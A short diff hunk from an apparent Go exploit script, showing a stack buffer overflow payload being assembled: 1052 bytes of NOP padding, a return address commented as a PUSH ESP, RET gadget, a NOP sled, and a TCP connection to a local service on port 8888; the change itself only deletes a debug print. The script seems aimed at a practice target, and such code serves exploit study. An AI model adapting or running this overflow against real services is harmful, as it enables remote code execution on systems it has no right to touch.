@@ -22,7 +22,6 @@ func main() {
 	padding1 := strings.Repeat("\x90", 1052)
 	EIP := "\xB5\x42\xA8\x68" // 0x68A842B5 -> PUSH ESP, RET
 	NOPS := strings.Repeat("\x90", 30)
-	println(NOPS)
 
 	conn, err := net.Dial("tcp", "127.0.0.1:8888")
 	if err != nil {
